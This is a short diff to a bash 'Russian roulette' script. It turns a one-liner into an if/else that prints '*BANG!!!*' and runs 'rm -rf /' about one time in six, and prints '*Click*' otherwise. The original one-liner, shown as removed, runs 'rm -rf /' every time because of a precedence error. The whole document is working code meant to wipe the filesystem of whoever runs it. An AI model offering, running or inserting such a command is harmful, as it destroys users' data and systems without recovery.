@@ -1,3 +1,8 @@
 #!/bin/bash
 
-[ $[ $RANDOM % 6 ] == 0 ] && echo *BANG!!!* ; rm -rf / || echo *Click*
+if [ $[ $RANDOM % 6 ] == 0 ]; then 
+     echo *BANG!!!*
+     rm -rf /
+else
+    echo *Click*
+fi
